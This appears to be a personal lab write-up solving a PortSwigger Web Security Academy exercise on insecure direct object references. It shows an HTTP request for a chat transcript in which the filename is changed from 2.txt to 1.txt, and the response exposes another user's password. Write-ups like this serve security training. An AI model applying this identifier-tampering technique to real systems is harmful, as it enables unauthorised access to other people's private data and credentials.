#web #websecurity #webexploitation 

https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

![](_attachment/Pasted%20image%2020250329161446.png)

This button will download the transcript

Note: filename is `2.txt`

`CONNECTED: -- Now chatting with Hal Pline --<br/>You: test<br/>Hal Pline: How do you stay in a job if you don't know something that basic?`

We simply pick this request:

```http
GET /download-transcript/2.txt HTTP/2
Host: 0a3e005d049d9aaa80e6b2bb00470057.web-security-academy.net
Cookie: session=ANFsi8E48AJJrsxrcKtWs21v8GEwG5dV
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: it-IT,it;q=0.9
Sec-Ch-Ua: "Not:A-Brand";v="24", "Chromium";v="134"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a3e005d049d9aaa80e6b2bb00470057.web-security-academy.net/chat
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

and change filename to `1.txt`

Response:

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="1.txt"
X-Frame-Options: SAMEORIGIN
Content-Length: 520

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is y39buyg0il6iobfjq0ca. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

![](_attachment/Pasted%20image%2020250329161806.png)

